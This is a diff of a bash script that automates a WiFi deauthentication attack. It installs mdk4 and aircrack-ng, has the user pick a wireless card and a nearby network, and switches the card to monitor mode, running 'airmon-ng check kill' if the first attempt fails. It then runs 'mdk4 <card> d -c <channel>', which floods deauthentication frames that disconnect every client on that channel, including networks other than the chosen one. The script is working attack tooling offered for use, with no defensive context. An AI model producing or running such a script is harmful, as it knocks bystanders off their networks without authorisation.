@@ -5,19 +5,36 @@ if [ "$(id -u)" -ne 0 ]; then
 fi
 
 clear
-echo "Checking if mdk4 is installed"
-sleep 1
-if ! command -v mdk4 &>/dev/null; then
-  echo "mdk4 is not installed on your system."
-  echo "Installing mdk4"
-  echo "sudo apt install mdk4 -y"
-  exit 1
-fi
 
-echo "mdk4 is installed on your system."
+# Function to check if a package is installed
+check_package() {
+    dpkg -l | grep -q $1
+}
+
+# Check if mdk4 is installed
+if ! check_package mdk4; then
+    echo "mdk4 is not installed. Installing..."
+    sudo apt update
+    sudo apt install -y mdk4
+    echo "mdk4 has been installed."
+else
+    echo "mdk4 is already installed."
+fi
 sleep 1
+# Check if aircrack-ng is installed
+if ! check_package aircrack-ng; then
+    echo "aircrack-ng is not installed. Installing..."
+    sudo apt update
+    sudo apt install -y aircrack-ng
+    echo "aircrack-ng has been installed."
+else
+    echo "aircrack-ng is already installed."
+fi
+sleep 1
+
 clear
-echo "Available WiFi Cards:"
+echo "Please pick a WiFi Card that supports monitor mode:"
+
 
 # Use the 'iwconfig' command to list wireless interfaces
 wifi_cards=($(iwconfig 2>/dev/null | grep -o '^[a-zA-Z0-9]*'))
@@ -38,14 +55,26 @@ else
     echo "Invalid selection. Please enter a valid number."
 fi
 
-# Check if the interface is in monitor mode
-mode=$(iwconfig "$selected_wifi_card" | grep "Mode:Monitor")
-
-if [ -n "$mode" ]; then
-    # Interface is in monitor mode, switch it to normal mode
-    sudo iwconfig $selected_wifi_card mode managed
+# Check if NetworkManager is running
+if ! systemctl is-active --quiet NetworkManager; then
+    # Start NetworkManager if it's not running
+    echo "NetworkManager is not running starting now..."
+    sleep 1
+    sudo systemctl start NetworkManager
+    echo "NetworkManager has been started."
+else
+    echo "NetworkManager is already running."
 fi
 
+sleep 1
+
+if sudo iwconfig $selected_wifi_card mode managed 2>/dev/null; then
+    echo "Wireless interface $selected_wifi_card set to managed mode."
+else
+    echo "Error setting wireless interface to managed mode."
+    sleep 1
+fi
+clear
 # List available WiFi network names (SSIDs) with corresponding numbers
 echo "Please wait for available WiFi Networks:"
 wifi_list=$(nmcli -f SSID dev wifi list | tail -n +2 | awk '$1 != "--" {print $1}')
@@ -77,9 +106,11 @@ fi
 channel=$(nmcli -f SSID,CHAN dev wifi list | grep -w "$selected_network" | awk '{print $2}')
 clear
 
-echo "$selected_network is on channel $channel"
-echo "you can check if there are other networks on the same channel with:"
-echo " 'nmcli dev wifi list' "
+# Use nmcli to list WiFi networks on the specified channel
+echo "Other WiFi networks on channel $channel:"
+nmcli dev wifi list | grep -E "(^|\s)$channel\s" | sed 's/^\s*//;s/\*//'
+
+
 while true; do
     read -p "Do you want to continue (y/n)? " choice
     case "$choice" in
@@ -99,13 +130,29 @@ while true; do
     esac
 done
 
+# Set the wireless interface to monitor mode
+if sudo iwconfig $selected_wifi_card mode monitor 2>/dev/null; then
+    echo "Wireless interface $selected_wifi_card set to monitor mode."
+else
+    echo "Error setting wireless interface to monitor mode. Running airmon-ng check kill..."
+    sudo airmon-ng check kill
+    echo "Attempting to set monitor mode again..."
+    if sudo iwconfig $selected_wifi_card mode monitor 2>/dev/null; then
+        echo "Wireless interface $selected_wifi_card set to monitor mode."
+    else
+        echo "Error: Unable to set wireless interface to monitor mode even after running airmon-ng check kill."
+        exit
+    fi
+fi
+sleep 1
+clear
 # Check if the network was found and display the channel if available
 if [ -n "$channel" ]; then
 
-    sudo iwconfig $selected_wifi_card mode monitor
     sudo mdk4 $selected_wifi_card d -c $channel
 
 else
     echo "Network '$selected_network' not found or unable to retrieve channel information."
 fi
 sudo iwconfig $selected_wifi_card mode managed
+sudo systemctl start NetworkManager
